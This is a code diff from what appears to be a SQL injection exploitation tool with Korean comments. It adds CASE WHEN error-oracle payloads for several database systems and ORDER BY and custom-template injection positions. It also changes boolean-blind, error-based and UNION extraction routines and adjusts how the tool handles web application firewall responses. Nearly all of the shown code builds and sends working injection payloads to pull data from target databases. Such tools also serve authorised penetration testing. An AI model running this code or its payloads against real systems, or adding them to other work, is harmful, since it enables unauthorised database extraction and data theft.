@@ -70,6 +70,18 @@ _TECHNIQUE_LABELS: Dict[str, str] = {
 # 컨텍스트 자동 탐지 후보 (우선순위 순) — 마지막 빈 문자열은 numeric 컨텍스트
 CONTEXT_CANDIDATES = ["'", '"', "')", '")', "'))", ")", ""]
 
+# CASE WHEN 조건부 에러 오라클 — FALSE 분기에서 다중행 서브쿼리 에러를 유발한다.
+# CASE WHEN (cond) THEN 1 ELSE {err_sub} END 형태로 사용.
+# TRUE → 스칼라 1 반환(정상), FALSE → 서브쿼리가 다중 행 반환 → DB 에러 응답.
+# Oracle만 FROM dual 부착 필요. SQLite는 이 primitive가 동작하지 않아 미지원.
+COND_ERR_SUBQUERY: dict = {
+    "MySQL":      "(SELECT 1 UNION SELECT 2)",
+    "MariaDB":    "(SELECT 1 UNION SELECT 2)",
+    "MSSQL":      "(SELECT 1 UNION SELECT 2)",
+    "PostgreSQL": "(SELECT 1 UNION SELECT 2)",
+    "Oracle":     "(SELECT 1 FROM dual UNION SELECT 2 FROM dual)",
+}
+
 # DBMS별 식별자 quoting (좌, 우)
 QUOTE_CHARS = {
     "MySQL":      ("`", "`"),
@@ -161,6 +173,13 @@ class ExtractCtx:
     dbms: str                  # fingerprint 결과로 채워짐 (수동 지정 시 미리 채움)
     # 페이로드 종결 문자열. None=자동 탐지 트리거, ""=수동 numeric, "'"·'"'·"')"·"'))" 등=수동 명시
     quote_context: Optional[str]
+    # 주입 위치. None=자동 탐지. "where"=WHERE AND(기존), "where_case"=WHERE CASE WHEN 에러 오라클,
+    # "orderby"=ORDER BY CASE WHEN 에러 오라클, "custom"=사용자 전체 템플릿 직접 입력.
+    # boolean 기법 전용 (error/union은 "where" 고정).
+    position: Optional[str] = None
+    # "custom" position 전용 — 전체 페이로드 템플릿 문자열. {cond} 자리표시자를 이진탐색 조건으로 치환.
+    # 예: "' AND 1=(CASE WHEN ({cond}) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)-- "
+    blind_template: Optional[str] = None
 
     # 선택값 — default_factory 사용으로 mutable 공유 차단
     auth_headers: Dict[str, str] = field(default_factory=dict)
@@ -168,7 +187,11 @@ class ExtractCtx:
     # True이면 페이로드(코드가 생성한 SQL 삽입문)만 Base64 인코딩 후 원본값에 append.
     # 파라미터 값이 Base64로 인코딩된 채로 서버에 전달되어야 하는 대상용.
     base64_encode: bool = False
-    union_hex: bool = True
+    # HEX 인코딩 모드 — Error/Boolean/UNION 세 기법 공통.
+    # True(기본)면 멀티바이트(한글 등) 안전. False(raw)면 요청 수는 줄지만
+    # ASCII/단일바이트 데이터 전용 — 멀티바이트는 DBMS별 코드포인트 함수
+    # (ASCII/ORD/UNICODE) 반환값 불일치로 깨질 수 있다.
+    use_hex: bool = True
     union_columns: int = 0
     union_types: List[str] = field(default_factory=list)
     union_visible_idx: int = -1
@@ -186,11 +209,22 @@ class ExtractCtx:
     # 양방향 비교(true_ref / false_ref 중 sim 큰 쪽으로 분류)가 더 안정적.
     true_ref_text: Optional[str] = None
     false_ref_text: Optional[str] = None
+    # masked ref 캐시 — _capture_baseline에서 1회 계산 후 _blind_compare가 재사용.
+    # true_ref/false_ref/baseline은 세션 내내 불변이므로 매 비교마다 재마스킹할 필요 없음.
+    masked_true_ref: Optional[str] = None
+    masked_false_ref: Optional[str] = None
+    masked_baseline: Optional[str] = None
 
     # 내부 상태
     _session: Optional[requests.Session] = None
     cancelled: bool = False
     _throttle_retried: bool = False  # 429/503 자동 감속 1회 한정 플래그
+    # MSSQL DB 목록 캐시 — count_search와 _search_mssql_multidb가 각각 호출하던
+    # _mssql_all_db_names 이중 순회를 제거한다. 세션 내 불변이므로 1회 캐시로 충분.
+    _mssql_db_names: Optional[List[str]] = None
+    # MSSQL 검색 per-DB 카운트 캐시 — (target, match, keyword) → List[(db, cnt)].
+    # count_search가 계산한 결과를 _search_mssql_multidb가 재사용해 이중 순회 제거.
+    _mssql_search_counts: Dict[Tuple[str, str, str], List[Tuple[str, int]]] = field(default_factory=dict)
 
 
 # ── 세션 / 요청 헬퍼 ─────────────────────────────────────────────────────────
@@ -224,6 +258,35 @@ def _qid(ctx: ExtractCtx, name: str) -> str:
     """
     l, r = QUOTE_CHARS[ctx.dbms]
     return l + name.replace(r, r + r) + r
+
+
+def _qlit(value: str) -> str:
+    """SQL 문자열 리터럴 이스케이프 — 단일 인용부호를 두 배로 처리(ANSI 표준, 전 DBMS 공통)."""
+    return value.replace("'", "''")
+
+
+def _mssql_split_table(tbl: str) -> Tuple[str, str]:
+    """MSSQL 테이블 식별자를 (schema, table)로 분리한다.
+
+    테이블 목록·검색 결과가 "schema.table" 형태로 반환되므로 이를 분해해 사용한다.
+    점이 없으면(레거시 저장 데이터 등) 기본 스키마 dbo로 간주해 하위 호환을 유지한다.
+    """
+    if "." in tbl:
+        schema, _, name = tbl.partition(".")
+        return schema, name
+    return "dbo", tbl
+
+
+def _build_search_where(col: str, match: str, keyword: str) -> str:
+    """검색 WHERE 절 조립 — exact는 '=', contains는 LIKE '%kw%'.
+
+    keyword 안의 %, _ 는 LIKE 와일드카드로 그대로 동작한다(이스케이프하지 않음).
+    MySQL/MariaDB는 문자열 리터럴에서 백슬래시를 이스케이프 문자로 재해석해
+    ESCAPE '\\' 사용 시 리터럴이 깨지므로, 와일드카드 이스케이프 자체를 하지 않는다.
+    """
+    if match == "exact":
+        return f"{col}='{_qlit(keyword)}'"
+    return f"{col} LIKE '%{_qlit(keyword)}%'"
 
 
 def _decode_hex(dbms: str, hex_str: str) -> str:
@@ -298,21 +361,6 @@ def _dict_to_xml_cdata(params: Dict[str, str], vuln_key: str) -> str:
     return "".join(parts)
 
 
-def _is_waf_response(ctx: ExtractCtx, resp: requests.Response) -> bool:
-    """WAF 결합 검출 — status code + body keyword 두 신호로 판정.
-
-    1. status가 WAF_STATUS_CODES(403/406/419/429/503)에 속하면 즉시 의심
-    2. body에 WAF 키워드가 있고, 해당 키워드가 ctx.waf_baseline_kws에 없으면 의심
-       (baseline에 자연 발생한 키워드는 오탐 마스킹)
-    """
-    if resp.status_code in WAF_STATUS_CODES:
-        return True
-    body_lower = resp.text.lower()
-    for kw in WAF_KEYWORDS:
-        if kw in body_lower and kw not in ctx.waf_baseline_kws:
-            return True
-    return False
-
 
 def _throttle(ctx: ExtractCtx, secs: Optional[float] = None) -> None:
     """딜레이 대기 — 대기 도중 [중단](ctx.cancelled)되면 즉시 InterruptedError를 던진다.
@@ -333,10 +381,16 @@ def _throttle(ctx: ExtractCtx, secs: Optional[float] = None) -> None:
         raise InterruptedError("user cancelled")
 
 
-def _send(ctx: ExtractCtx, payload: str) -> requests.Response:
+def _send(ctx: ExtractCtx, payload: str,
+          success_marker: Optional[str] = None) -> requests.Response:
     """추출 모드 전용 요청 전송 — 사전/사후 netloc 검증 + WAF 가드 + 재시도.
 
     payload는 vuln_param의 원본 값에 append된다. body_type에 따라 form/json/xml로 분기.
+
+    success_marker: _union_extract·_error_extract가 전달하는 추출 성공 마커.
+    응답에 마커가 반사된 경우 실제 데이터가 담긴 정상 응답이므로 body-keyword
+    WAF 판정을 건너뛴다 — raw 모드 데이터에 WAF 키워드가 포함될 때의 오탐 방지.
+    status code 판정(403/429 등)은 success_marker 유무와 무관하게 항상 수행한다.
 
     재시도 정책:
     - timeout / connection 오류: 1회 재시도
@@ -402,9 +456,16 @@ def _send(ctx: ExtractCtx, payload: str) -> requests.Response:
             # 2회째도 rate limit → 추출 중단 신호
             raise WAFBlockedError(f"rate limit persisted (status={resp.status_code})")
 
-        # WAF 결합 가드 (status + body keyword + baseline 마스킹)
-        if _is_waf_response(ctx, resp):
+        # WAF 결합 가드 — status code는 success_marker 유무와 무관하게 항상 확인
+        if resp.status_code in WAF_STATUS_CODES:
             raise WAFBlockedError(f"WAF blocked (status={resp.status_code})")
+        # body keyword — success_marker가 응답에 반사되면 실제 데이터 응답이므로 스킵
+        # (raw 모드에서 추출값에 "blocked"/"forbidden" 등이 포함돼도 오탐하지 않음)
+        if not (success_marker and success_marker in resp.text):
+            body_lower = resp.text.lower()
+            for kw in WAF_KEYWORDS:
+                if kw in body_lower and kw not in ctx.waf_baseline_kws:
+                    raise WAFBlockedError(f"WAF blocked (body keyword: {kw})")
 
         return resp
 
@@ -460,6 +521,15 @@ def _capture_baseline(ctx: ExtractCtx) -> None:
     except Exception:
         ctx.false_ref_text = None
 
+    # masked ref 1회 캐시 — true_ref/false_ref/baseline은 세션 불변이므로
+    # _blind_compare가 매 호출마다 재마스킹하지 않도록 여기서 미리 계산한다.
+    ctx.masked_baseline = apply_dynamic_mask(ctx.baseline_resp_text or "",
+                                             ctx.dynamic_contexts)
+    ctx.masked_true_ref = (apply_dynamic_mask(ctx.true_ref_text, ctx.dynamic_contexts)
+                           if ctx.true_ref_text is not None else None)
+    ctx.masked_false_ref = (apply_dynamic_mask(ctx.false_ref_text, ctx.dynamic_contexts)
+                            if ctx.false_ref_text is not None else None)
+
 
 # ── DBMS / 컨텍스트 / UNION visible 자동 탐지 ───────────────────────────────
 
@@ -508,57 +578,83 @@ def _detect_dbms(ctx: ExtractCtx) -> Optional[str]:
 
 
 def _detect_context(ctx: ExtractCtx) -> Optional[str]:
-    """컨텍스트 자동 탐지 — CONTEXT_CANDIDATES 우선순위로 두 가지 판정 시도.
+    """quote_context + position 통합 탐지.
 
-    ① Boolean 판정: AND 1=1 / AND 1=2 페어의 응답 차이가 크면 채택.
-    ② 에러 전이 판정: Boolean이 실패할 때 후보를 단독 주입해 에러가 발생하고,
-       정상 종결 시 에러가 사라지면 채택 (string 컨텍스트의 error-based 타겟 대응).
-       numeric 후보(빈 문자열)는 단독 주입 페이로드가 없으므로 ② 판정 대상에서 제외.
-    채택된 종결 문자열은 ctx.quote_context에 그대로 저장 (quote/suffix 분리 없음).
-    모두 실패하면 None 반환 (호출부가 사용자 수동 모드 권장).
+    ctx.quote_context=None이면 CONTEXT_CANDIDATES를 순서대로 시도 (자동).
+    ctx.position=None이면 위치 후보를 탐지; boolean 기법 전용으로 Phase 2를 추가 탐지한다.
+
+    탐지 순서:
+      Phase 1 — "where": AND 1=1/1=2 응답 차이(① Boolean 판정) + ② 에러 전이 판정.
+      Phase 2 — "where_case" → "orderby": CASE WHEN 에러 오라클
+               (ctx.technique=="boolean" 이고 ctx.dbms가 COND_ERR_SUBQUERY에 있을 때만).
+
+    채택 시 ctx.quote_context + ctx.position 갱신. 실패 시 None 반환 + ctx 복원.
     """
+    auto_qc  = ctx.quote_context is None
+    auto_pos = ctx.position is None
+
+    saved_qc       = ctx.quote_context
+    saved_pos      = ctx.position
     saved_baseline = ctx.baseline_resp_text
     saved_dyn      = ctx.dynamic_contexts
     saved_kws      = ctx.waf_baseline_kws
 
-    for cand in CONTEXT_CANDIDATES:
-        try:
-            # 후보 컨텍스트 적용 — baseline은 후보별로 새로 캡처하지 않고 단순 비교
-            ctx.quote_context = cand
-            true_p  = f"{cand} AND 1=1 -- "
-            false_p = f"{cand} AND 1=2 -- "
-            r_true  = _send_fingerprint(ctx, true_p)
-            r_false = _send_fingerprint(ctx, false_p)
-        except WAFBlockedError:
-            raise
-        except Exception:
-            continue
+    qc_cands = CONTEXT_CANDIDATES if auto_qc else [ctx.quote_context]
 
-        sim = similarity(r_true.text, r_false.text)
-        # ① Boolean 판정 — true와 false 응답이 명확히 갈리면 컨텍스트 후보 채택
-        # (임계값은 자연 변동을 흡수하기 위해 0.95보다 약간 완화한 0.9)
-        if sim < 0.9:
-            return cand
+    # 위치 후보 구성 — 수동 지정이면 해당 위치만, 자동이면 Phase 1/2 순차 시도
+    if not auto_pos:
+        pos_phases = [[ctx.position]]
+    else:
+        pos_phases = [["where"]]
+        if ctx.technique == "boolean" and ctx.dbms in COND_ERR_SUBQUERY:
+            pos_phases.append(["where_case", "orderby"])
 
-        # ② 에러 전이 판정 — Boolean이 통하지 않는 error-based 타겟 대응
-        # numeric 후보(빈 문자열)는 단독 주입 페이로드가 없으므로 스킵
-        if not cand:
-            continue
-        # 정상 종결 응답에 에러가 없어야 의미 있는 전이 판정 가능
-        if _match_error_signature(r_true.text) is not None:
-            continue
-        try:
-            r_break = _send_fingerprint(ctx, cand)  # cand 단독 = 따옴표 미종결 상태
-        except WAFBlockedError:
-            raise
-        except Exception:
-            continue
-        # 단독 주입 시 에러 발생 + 정상 종결 시 에러 소멸 → 컨텍스트 확정
-        if _match_error_signature(r_break.text) is not None:
-            return cand
+    for pos_group in pos_phases:
+        for pos in pos_group:
+            for cand in qc_cands:
+                ctx.quote_context = cand
+                ctx.position = pos
 
-    # 실패 — 컨텍스트 복원 후 None
-    ctx.quote_context = ""
+                if pos == "where":
+                    # ① Boolean 판정 — AND 1=1 / AND 1=2 응답 차이
+                    try:
+                        r_true  = _send_fingerprint(ctx, f"{cand} AND 1=1 -- ")
+                        r_false = _send_fingerprint(ctx, f"{cand} AND 1=2 -- ")
+                    except WAFBlockedError:
+                        raise
+                    except Exception:
+                        continue
+                    if similarity(r_true.text, r_false.text) < 0.9:
+                        return cand
+                    # ② 에러 전이 판정 (numeric 후보·종결 후 에러 있는 경우 제외)
+                    if not cand or _match_error_signature(r_true.text) is not None:
+                        continue
+                    try:
+                        r_break = _send_fingerprint(ctx, cand)
+                    except WAFBlockedError:
+                        raise
+                    except Exception:
+                        continue
+                    if _match_error_signature(r_break.text) is not None:
+                        return cand
+
+                else:
+                    # CASE WHEN 에러 오라클 판정
+                    # TRUE → 정상 응답(에러 없음), FALSE → 다중행 서브쿼리 에러
+                    try:
+                        r_true  = _send_fingerprint(ctx, _build_blind_compare_payload(ctx, "1=1"))
+                        r_false = _send_fingerprint(ctx, _build_blind_compare_payload(ctx, "1=2"))
+                    except WAFBlockedError:
+                        raise
+                    except Exception:
+                        continue
+                    if (_match_error_signature(r_true.text) is None
+                            and similarity(r_true.text, r_false.text) < 0.9):
+                        return cand
+
+    # 전 후보 탈락 — ctx 복원 후 None 반환
+    ctx.quote_context      = saved_qc
+    ctx.position           = saved_pos
     ctx.baseline_resp_text = saved_baseline
     ctx.dynamic_contexts   = saved_dyn
     ctx.waf_baseline_kws   = saved_kws
@@ -662,15 +758,16 @@ def _detect_union_visible(ctx: ExtractCtx) -> int:
 def fingerprint(ctx: ExtractCtx,
                 progress_cb: Optional[Callable[[int, int], None]] = None
                 ) -> ExtractCtx:
-    """컨텍스트와 DBMS를 식별하여 ctx를 갱신한다.
+    """컨텍스트·위치·DBMS를 식별하여 ctx를 갱신한다.
 
     technique은 fingerprint가 자동 선택하지 않는다 — 사용자 입력 시점에 이미
     ctx.technique에 저장되어 있으며, fingerprint는 해당 기법으로 추출이 가능한
     사전 조건만 검증한다.
 
-    ctx.quote_context가 사용자 수동 지정값이면 컨텍스트 자동 탐지는 스킵.
+    DBMS를 먼저 식별하고 컨텍스트/위치를 탐지한다 — CASE WHEN 에러 오라클 페이로드가
+    DBMS 의존적(Oracle: FROM dual 부착)이므로 탐지 순서가 기존과 다르다.
     ctx.technique == "union"이면 ctx.union_visible_idx 자동 탐지도 함께 수행.
-    SQLite + technique == "error"이면 UnsupportedTechniqueError를 raise.
+    SQLite + error/where_case/orderby 조합은 UnsupportedTechniqueError를 raise.
     """
     total_steps = 5
     step = 0
@@ -680,15 +777,8 @@ def fingerprint(ctx: ExtractCtx,
         if progress_cb:
             progress_cb(step, total_steps)
 
-    # 1. 컨텍스트 자동 탐지 (None일 때만 자동 탐지, 빈 문자열은 수동 numeric 명시)
-    if ctx.quote_context is None:
-        detected = _detect_context(ctx)
-        if detected is None:
-            raise UnsupportedTechniqueError("컨텍스트 자동 탐지 실패 — 수동 지정 필요")
-        ctx.quote_context = detected
-    _tick()
-
-    # 2. DBMS 식별 (사용자 수동 지정값이 있으면 스킵)
+    # 1. DBMS 식별 (사용자 수동 지정값이 있으면 스킵)
+    # CASE WHEN 에러 오라클 페이로드가 DBMS 의존적이므로 컨텍스트 탐지 전에 실행한다
     if not ctx.dbms:
         dbms = _detect_dbms(ctx)
         if dbms is None:
@@ -696,9 +786,30 @@ def fingerprint(ctx: ExtractCtx,
         ctx.dbms = dbms
     _tick()
 
-    # 3. SQLite + Error 사용자 선택 충돌 — 호출부가 재선택 메뉴 띄우도록 유도
+    # 2. 컨텍스트 + 위치 자동 탐지
+    # custom position은 사용자가 qc·구조를 템플릿에 직접 포함 → 탐지 전체 스킵
+    # boolean: qc 또는 position 중 하나라도 None이면 _detect_context 호출
+    # 그 외 기법: qc가 None일 때만 탐지 (position은 무관 — "where" 고정)
+    is_custom = (ctx.technique == "boolean" and ctx.position == "custom")
+    need_detect = (not is_custom) and (
+        (ctx.quote_context is None) or
+        (ctx.technique == "boolean" and ctx.position is None)
+    )
+    if need_detect:
+        detected = _detect_context(ctx)
+        if detected is None:
+            raise UnsupportedTechniqueError("컨텍스트 자동 탐지 실패 — 수동 지정 필요")
+        ctx.quote_context = detected
+    if ctx.position is None:
+        ctx.position = "where"  # boolean 비기법 또는 position 수동 지정 시 기본값
+    _tick()
+
+    # 3. 기법·위치 충돌 검증 — 호출부가 재선택 메뉴 띄우도록 유도
+    # custom은 사용자가 SQL을 완전 제어하므로 SQLite CASE WHEN 제한 비적용
     if ctx.dbms == "SQLite" and ctx.technique == "error":
         raise UnsupportedTechniqueError("SQLite는 Error-based 미지원")
+    if ctx.dbms == "SQLite" and ctx.position in ("where_case", "orderby"):
+        raise UnsupportedTechniqueError("SQLite는 CASE WHEN 에러 오라클 미지원")
 
     # 4. Boolean baseline 캡처 (Boolean 기법 선택 시에만 필요)
     if ctx.technique == "boolean":
@@ -816,22 +927,26 @@ def _error_extract(ctx: ExtractCtx, query: str) -> Optional[str]:
     반환값이 None이면 추출 실패 (마커 미반사 또는 응답 잘림).
     """
     payload, ml, mr = _build_error_payload(ctx, query)
-    resp = _send(ctx, payload)
+    # ml이 응답에 반사되면 실제 에러 메시지 응답 → body-keyword WAF 오탐 방지
+    resp = _send(ctx, payload, success_marker=ml)
     return _extract_error_marker(resp.text, ml, mr)
 
 
 def _extract_long_string(ctx: ExtractCtx, query: str) -> str:
-    """Error-based 결과 길이 제한 회피 — HEX 인코딩 + SUBSTRING 청크 분할 추출.
+    """Error-based 결과 길이 제한 회피 — SUBSTRING 청크 분할 추출.
 
-    각 DBMS 에러 메시지 출력 한계를 우회하기 위해 HEX(=2배 길이)로 변환 후
-    ERROR_CHUNK_HEX[dbms] 단위로 분할 추출하여 결합.
+    use_hex=True(기본): HEX 인코딩(=2배 길이) 후 ERROR_CHUNK_HEX[dbms] 단위로
+    분할 추출·디코드 — 멀티바이트 안전.
+    use_hex=False: 원문에 직접 SUBSTRING 적용 — ASCII/단일바이트 데이터 전용.
+    같은 chunk_len(hex 문자 기준 출력 한계)을 raw 문자 수로 재사용해도 안전하며,
+    청크당 실 데이터량이 2배가 되어 요청 수가 약 절반으로 줄어든다.
     """
-    hex_expr = HEX_FUNCS[ctx.dbms].format(f"({query})")
     f = DBMS_FUNCS[ctx.dbms]
     chunk_len = ERROR_CHUNK_HEX[ctx.dbms]
+    expr = HEX_FUNCS[ctx.dbms].format(f"({query})") if ctx.use_hex else f"({query})"
 
     # 길이 추출 — _build_error_payload가 자동으로 (expr) 서브쿼리 감쌈
-    length_raw = _error_extract(ctx, f"{f['length']}({hex_expr})")
+    length_raw = _error_extract(ctx, f"{f['length']}({expr})")
     if length_raw is None:
         return ""
     try:
@@ -846,20 +961,40 @@ def _extract_long_string(ctx: ExtractCtx, query: str) -> str:
     for offset in range(0, total, chunk_len):
         if ctx.cancelled:
             break
-        chunk_query = f"{f['substr']}({hex_expr},{offset+1},{chunk_len})"
+        chunk_query = f"{f['substr']}({expr},{offset+1},{chunk_len})"
         chunk = _error_extract(ctx, chunk_query)
         if chunk is None:
             break
-        chunks.append(chunk.strip())
-    hex_str = "".join(chunks)
-    return _decode_hex(ctx.dbms, hex_str)
+        # raw 모드는 데이터 내 공백이 유효할 수 있어 strip 생략
+        chunks.append(chunk.strip() if ctx.use_hex else chunk)
+    joined = "".join(chunks)
+    return _decode_hex(ctx.dbms, joined) if ctx.use_hex else joined
 
 
 # ── Boolean-blind 페이로드 / 추출 ───────────────────────────────────────────
 
 def _build_blind_compare_payload(ctx: ExtractCtx, condition: str) -> str:
-    """Boolean true/false 판정용 페이로드 — 종결 문자열 + AND (condition)."""
-    return f"{ctx.quote_context} AND ({condition}) -- "
+    """Boolean true/false 판정용 페이로드 — position에 따라 구조 분기.
+
+    where      : {qc} AND ({condition}) --
+    where_case : {qc} AND 1=(CASE WHEN ({condition}) THEN 1 ELSE {err} END) --
+    orderby    : {qc},(CASE WHEN ({condition}) THEN 1 ELSE {err} END) --
+    custom     : ctx.blind_template의 {cond}를 condition으로 치환 (qc·구조 모두 사용자 정의)
+
+    where_case / orderby는 condition=true → 정상 응답, false → 다중행 서브쿼리 에러 응답.
+    """
+    qc  = ctx.quote_context
+    pos = ctx.position or "where"
+    if pos == "custom":
+        # {cond} 자리표시자를 이진탐색 조건으로 치환 (format() 미사용 — 중괄호 충돌 방지)
+        return (ctx.blind_template or "").replace("{cond}", condition)
+    if pos in ("where_case", "orderby"):
+        err_sub = COND_ERR_SUBQUERY[ctx.dbms]
+        if pos == "where_case":
+            return f"{qc} AND 1=(CASE WHEN ({condition}) THEN 1 ELSE {err_sub} END) -- "
+        return f"{qc},(CASE WHEN ({condition}) THEN 1 ELSE {err_sub} END) -- "
+    # "where" (기존)
+    return f"{qc} AND ({condition}) -- "
 
 
 def _blind_compare(ctx: ExtractCtx, condition: str) -> bool:
@@ -880,16 +1015,18 @@ def _blind_compare(ctx: ExtractCtx, condition: str) -> bool:
     resp = _send(ctx, payload)
     masked_resp = apply_dynamic_mask(resp.text, ctx.dynamic_contexts)
 
-    # dual baseline 우선 사용 — true_ref / false_ref 모두 캡처됐을 때
-    if ctx.true_ref_text is not None and ctx.false_ref_text is not None:
-        masked_true = apply_dynamic_mask(ctx.true_ref_text, ctx.dynamic_contexts)
-        masked_false = apply_dynamic_mask(ctx.false_ref_text, ctx.dynamic_contexts)
-        sim_true = similarity(masked_resp, masked_true)
-        sim_false = similarity(masked_resp, masked_false)
+    # dual baseline 우선 사용 — _capture_baseline에서 1회 캐시한 masked ref 재사용
+    # (true_ref/false_ref는 세션 불변 → 매 호출 재마스킹 불필요)
+    if ctx.masked_true_ref is not None and ctx.masked_false_ref is not None:
+        sim_true = similarity(masked_resp, ctx.masked_true_ref)
+        sim_false = similarity(masked_resp, ctx.masked_false_ref)
         return sim_true > sim_false
 
-    # fallback: 단일 baseline 비교 (캡처 실패·미실행 환경)
-    masked_base = apply_dynamic_mask(ctx.baseline_resp_text or "", ctx.dynamic_contexts)
+    # fallback: 단일 baseline 비교 (캐시 없는 환경 — _capture_baseline 미실행)
+    masked_base = (ctx.masked_baseline
+                   if ctx.masked_baseline is not None
+                   else apply_dynamic_mask(ctx.baseline_resp_text or "",
+                                          ctx.dynamic_contexts))
     return similarity(masked_base, masked_resp) >= BLIND_SIM_THRESHOLD
 
 
@@ -923,11 +1060,15 @@ def _blind_int(ctx: ExtractCtx, expr: str, max_value: int = 1_000_000) -> Option
     return lo
 
 
-def _blind_char_in_range(ctx: ExtractCtx, hex_expr: str, pos: int,
+def _blind_char_in_range(ctx: ExtractCtx, expr: str, pos: int,
                          lo: int = 48, hi: int = 70) -> int:
-    """HEX 문자 한 글자 ASCII 코드 이분탐색 (기본 범위 0-9A-F = 48~70)."""
+    """문자 한 글자의 코드값 이분탐색.
+
+    기본 범위(48~70)는 HEX 문자(0-9A-F) 전용. raw 모드 호출 시 lo=0, hi=255
+    (단일바이트 ASCII/Latin-1)로 호출측에서 지정한다.
+    """
     f = DBMS_FUNCS[ctx.dbms]
-    char_expr = f"{f['ascii']}({f['substr']}({hex_expr},{pos},1))"
+    char_expr = f"{f['ascii']}({f['substr']}({expr},{pos},1))"
     while lo < hi:
         if ctx.cancelled:
             return lo
@@ -939,27 +1080,60 @@ def _blind_char_in_range(ctx: ExtractCtx, hex_expr: str, pos: int,
     return lo
 
 
-def _blind_string(ctx: ExtractCtx, query: str, max_bytes: int = 1_000_000) -> Optional[str]:
-    """HEX 인코딩으로 multi-byte 안전 추출.
+def _blind_hex_expr(ctx: ExtractCtx, query: str) -> str:
+    """Boolean-blind 전용 HEX 표현 — 항상 대문자·'0x' 접두사 없는 형태로 정규화.
 
-    - 한글/일본어/이모지 안전: HEX 결과는 ASCII 0-9A-F만이므로 글자당 약 5요청.
-    - NULL이면 None, 길이 0이면 빈 문자열, 부분 결과(취소·timeout)도 디코드 시도.
+    _blind_char_in_range의 탐색 범위 [48,70](0-9,A-F)과 _decode_hex 양쪽 모두
+    대문자·접두사 없는 형태를 가정한다. HEX_FUNCS는 DBMS에 따라 소문자 출력이나
+    '0x' 접두사가 붙어 Boolean 이분탐색을 파손하므로 이 함수로 정규화한다.
+      - PostgreSQL: ENCODE(...)는 소문자 hex → UPPER() 감쌈
+      - MSSQL: fn_varbintohexstr(...)는 소문자 + '0x' 접두사 → UPPER(SUBSTRING(...,3,...))
+      - 나머지(MySQL/MariaDB/Oracle/SQLite): HEX/RAWTOHEX가 이미 대문자·접두사 없음
+    """
+    inner = f"({query})"
+    if ctx.dbms == "PostgreSQL":
+        return f"UPPER(ENCODE({inner}::TEXT::bytea,'hex'))"
+    if ctx.dbms == "MSSQL":
+        hex_expr = (f"master.dbo.fn_varbintohexstr("
+                    f"CAST(CONVERT(NVARCHAR(MAX),{inner}) AS varbinary(MAX)))")
+        # SUBSTRING(...,3,...) 으로 '0x' 2자 제거 후 UPPER
+        return f"UPPER(SUBSTRING({hex_expr},3,2147483647))"
+    return HEX_FUNCS[ctx.dbms].format(inner)
+
+
+def _blind_string(ctx: ExtractCtx, query: str, max_bytes: int = 1_000_000) -> Optional[str]:
+    """Boolean-blind 문자열 추출.
+
+    use_hex=True(기본): HEX 인코딩 후 이분탐색 — 한글/일본어/이모지 등 멀티바이트
+    안전. HEX 결과는 0-9A-F만이므로 글자당 약 5요청, 원문 글자당 약 10요청.
+    use_hex=False: 원문에 0~255 범위로 직접 이분탐색 — ASCII/단일바이트 데이터
+    전용(멀티바이트는 DBMS별 ascii 함수 반환값 불일치로 부정확). 원문 글자당
+    약 8요청이며 HEX 변환이 없어 총 요청 수가 더 적다.
+    NULL이면 None, 길이 0이면 빈 문자열, 부분 결과(취소·timeout)도 반환 시도.
     """
     if _blind_compare(ctx, f"({query}) IS NULL"):
         return None
-    hex_expr = HEX_FUNCS[ctx.dbms].format(f"({query})")
     f = DBMS_FUNCS[ctx.dbms]
-    hex_len = _blind_int(ctx, f"{f['length']}({hex_expr})", max_value=max_bytes * 2)
-    if hex_len is None or hex_len == 0:
-        return "" if hex_len == 0 else None
+    if ctx.use_hex:
+        # _blind_hex_expr: PG/MSSQL 소문자·0x 문제를 정규화한 Boolean 전용 HEX 표현
+        expr = _blind_hex_expr(ctx, query)
+        length = _blind_int(ctx, f"{f['length']}({expr})", max_value=max_bytes * 2)
+    else:
+        expr = f"({query})"
+        length = _blind_int(ctx, f"{f['length']}({expr})", max_value=max_bytes)
+    if length is None or length == 0:
+        return "" if length == 0 else None
 
-    hex_str = ""
-    for pos in range(1, hex_len + 1):
+    chars = ""
+    for pos in range(1, length + 1):
         if ctx.cancelled:
             break
-        ch_code = _blind_char_in_range(ctx, hex_expr, pos)
-        hex_str += chr(ch_code)
-    return _decode_hex(ctx.dbms, hex_str)
+        if ctx.use_hex:
+            ch_code = _blind_char_in_range(ctx, expr, pos)
+        else:
+            ch_code = _blind_char_in_range(ctx, expr, pos, lo=0, hi=255)
+        chars += chr(ch_code)
+    return _decode_hex(ctx.dbms, chars) if ctx.use_hex else chars
 
 
 # ── UNION-based 페이로드 / 추출 ─────────────────────────────────────────────
@@ -967,11 +1141,11 @@ def _blind_string(ctx: ExtractCtx, query: str, max_bytes: int = 1_000_000) -> Op
 def _build_union_payload(ctx: ExtractCtx, query: str) -> str:
     """UNION-based 페이로드 — visible 컬럼 위치에 마커로 감싼 query 주입.
 
-    union_hex=True이면 query 결과를 HEX_FUNCS로 감싸 multibyte 안전 추출.
+    use_hex=True이면 query 결과를 HEX_FUNCS로 감싸 multibyte 안전 추출.
     문자열 연결 연산자는 DBMS별로 분기 (MySQL/MariaDB는 CONCAT, MSSQL은 +, 그 외는 ||).
     marker는 CHAR/CHR로 인코딩해 응답 echo 환경에서도 렌더링 결과만 정확히 매칭.
     """
-    if ctx.union_hex:
+    if ctx.use_hex:
         wrapped = HEX_FUNCS[ctx.dbms].format(f"({query})")
     else:
         wrapped = f"({query})"
@@ -1002,16 +1176,17 @@ def _build_union_payload(ctx: ExtractCtx, query: str) -> str:
 def _union_extract(ctx: ExtractCtx, query: str) -> Optional[str]:
     """UNION 응답에서 visible 컬럼 값 추출.
 
-    union_hex=True이면 추출된 HEX를 _decode_hex로 디코드.
+    use_hex=True이면 추출된 HEX를 _decode_hex로 디코드.
     """
     payload = _build_union_payload(ctx, query)
-    resp = _send(ctx, payload)
+    # UNION_MARK_S가 응답에 반사되면 실제 UNION 결과 응답 → body-keyword WAF 오탐 방지
+    resp = _send(ctx, payload, success_marker=UNION_MARK_S)
     m = re.search(re.escape(UNION_MARK_S) + r"(.*?)" + re.escape(UNION_MARK_E),
                   resp.text, re.DOTALL)
     if not m:
         return None
     raw = m.group(1)
-    return _decode_hex(ctx.dbms, raw) if ctx.union_hex else raw
+    return _decode_hex(ctx.dbms, raw) if ctx.use_hex else raw
 
 
 # ── 통합 단일 값 추출 (technique 라우팅) ────────────────────────────────────
@@ -1052,7 +1227,8 @@ def _q_count_databases(dbms: str) -> str:
     if dbms == "MSSQL":
         return "SELECT COUNT(*) FROM master.sys.databases"
     if dbms == "PostgreSQL":
